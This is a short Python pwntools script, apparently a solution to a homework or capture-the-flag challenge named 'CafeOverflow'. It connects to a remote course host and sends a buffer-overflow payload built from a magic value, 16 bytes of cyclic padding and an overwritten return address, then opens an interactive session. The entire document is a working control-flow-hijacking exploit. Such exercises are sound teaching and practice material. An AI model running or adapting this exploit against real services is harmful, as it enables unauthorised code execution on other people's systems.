#!/usr/bin/env python3
from pwn import *

context(arch='i386', terminal=['tmux', 'neww'])
r = remote('hw00.zoolab.org', 65534)
#r = process('./CafeOverflow')
e = ELF('./CafeOverflow')

payload = p64(0xcafecafecafecafe)
payload += cyclic(16)
payload += p64(0x401195)

r.sendline(payload)
r.interactive()
